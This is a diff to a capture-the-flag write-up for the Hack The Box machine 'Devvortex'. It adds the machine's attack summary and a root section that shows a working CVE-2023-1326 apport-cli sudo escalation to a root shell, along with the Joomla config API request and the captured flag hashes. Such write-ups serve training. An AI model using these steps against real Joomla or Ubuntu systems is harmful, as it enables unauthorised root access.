@@ -7,7 +7,13 @@ title: Devvortex Write-Up
 
 # Devvortex Write-Up
 
+<div class="center"><img src="https://labs.hackthebox.com/storage/avatars/2565d292772abc4a2d774117cf4d36ff.png" width="350"></div>
+
 ## Introduction
+
+<p>Devvortex is an "Easy" HTB machine. The following is its description on the platform:</p>
+
+> Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service's configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell.
 
 ## First Steps
 
@@ -259,70 +265,7 @@ curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" 
         "id": 224
       }
     },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "captcha": "0",
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "list_limit": 20,
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "access": 1,
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "debug": false,
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "debug_lang": false,
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "debug_lang_const": true,
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "dbtype": "mysqli",
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "host": "localhost",
-        "id": 224
-      }
-    },
+[...snip]
     {
       "type": "application",
       "id": "224",
@@ -339,38 +282,7 @@ curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" 
         "id": 224
       }
     },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "db": "joomla",
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "dbprefix": "sd4fg_",
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "dbencryption": 0,
-        "id": 224
-      }
-    },
-    {
-      "type": "application",
-      "id": "224",
-      "attributes": {
-        "dbsslverifyservercert": false,
-        "id": 224
-      }
-    }
+[...snip]
   ],
   "meta": {
     "total-pages": 4
@@ -506,3 +418,49 @@ af3dfe6520b8dffe6bdc801d09c0d8fc
 ```
 
 ## Root Flag
+
+<p>The first thing we will run after logging into the machine is running "sudo -l". We will get the following:</p>
+
+```bash
+sudo -l
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+```
+
+<p>It seems like there's a CVE related to privilege escalation with apport-cli. According to its <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">PoC</a>, we can become rooting by doing the following:</p>
+
+```bash
+sudo apport-cli -P 10610 -f
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+.......................
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (6.3 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+root@devvortex:/home/logan#
+```
+
+<p>After choosing "V", a different screen will show up. We can then enter "!/bin/bash" and press enter. We will become root.</p>
+
+<p>We can then grab the root flag:</p>
+
+```bash
+cat /root/root.txt
+6696e021cef172376451650f58ce1dfa
+```
